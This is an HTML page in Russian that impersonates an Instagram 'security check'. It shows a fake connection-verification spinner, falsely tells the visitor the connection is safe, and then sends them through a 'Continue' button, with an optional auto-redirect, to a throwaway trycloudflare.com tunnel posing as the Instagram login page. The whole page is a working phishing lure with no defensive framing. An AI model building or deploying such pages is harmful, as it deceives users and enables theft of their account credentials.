<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Security Check</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #262626; }
        .container { text-align: center; padding: 20px; max-width: 400px; }
        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #3897f0; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h1 { font-size: 18px; font-weight: 600; margin-bottom: 10px; }
        p { font-size: 14px; color: #8e8e8e; line-height: 1.5; }
        .btn { display: none; background-color: #0095f6; color: white; padding: 10px 20px; text-decoration: none; border-radius: 4px; font-weight: 600; font-size: 14px; margin-top: 20px; cursor: pointer; }
    </style>
</head>
<body>

<div class="container">
    <div id="status-icon" class="loader"></div>
    <h1 id="headline">Проверка безопасности...</h1>
    <p id="subtext">Пожалуйста, подождите, пока мы проверяем ваше соединение для безопасного входа в Instagram.</p>
    
    <a href=" https://pursuit-hispanic-baker-combination.trycloudflare.com" id="redirect-btn" class="btn">ПРОДОЛЖИТЬ</a>
</div>

<script>
    // Задержка в 4 секунды (4000 миллисекунд)
    setTimeout(function() {
        // Убираем анимацию загрузки
        document.getElementById('status-icon').style.display = 'none';
        
        // Меняем текст
        document.getElementById('headline').innerText = 'Проверка завершена';
        document.getElementById('subtext').innerText = 'Ваше соединение безопасно. Нажмите кнопку ниже, чтобы перейти на страницу входа.';
        
        // Показываем кнопку
        document.getElementById('redirect-btn').style.display = 'inline-block';
        
        // ОПЦИОНАЛЬНО: Автоматический переход через 1 секунду после появления кнопки
        // window.location.href = " https://pursuit-hispanic-baker-combination.trycloudflare.com";
        
    }, 4000);
</script>

</body>
</html>
